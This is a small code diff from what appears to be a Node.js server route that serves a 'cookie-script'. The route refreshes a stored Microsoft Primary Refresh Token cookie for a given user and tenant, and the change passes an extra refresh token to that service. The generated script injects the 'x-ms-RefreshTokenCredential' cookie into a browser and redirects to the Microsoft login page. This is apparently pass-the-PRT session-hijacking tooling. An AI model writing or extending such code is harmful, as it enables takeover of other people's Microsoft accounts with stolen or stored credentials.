@@ -248,7 +248,7 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
       try {
         const cookieConverter = require('../services/cookieconverter');
         console.log('[Tokens] Refreshing PRT cookie for user', token.user_id, 'tenant', tenant);
-        const freshPrt = await cookieConverter.refreshStoredPrtCookie(token.user_id, tenant);
+        const freshPrt = await cookieConverter.refreshStoredPrtCookie(token.user_id, tenant, refreshToken);
         if (freshPrt) {
           console.log('[Tokens] Fresh PRT cookie generated from device credentials');
           prtScript = `document.cookie = "x-ms-RefreshTokenCredential=${freshPrt}; path=/; secure; samesite=none";\nsetTimeout(() => {\n  window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 1000);`;
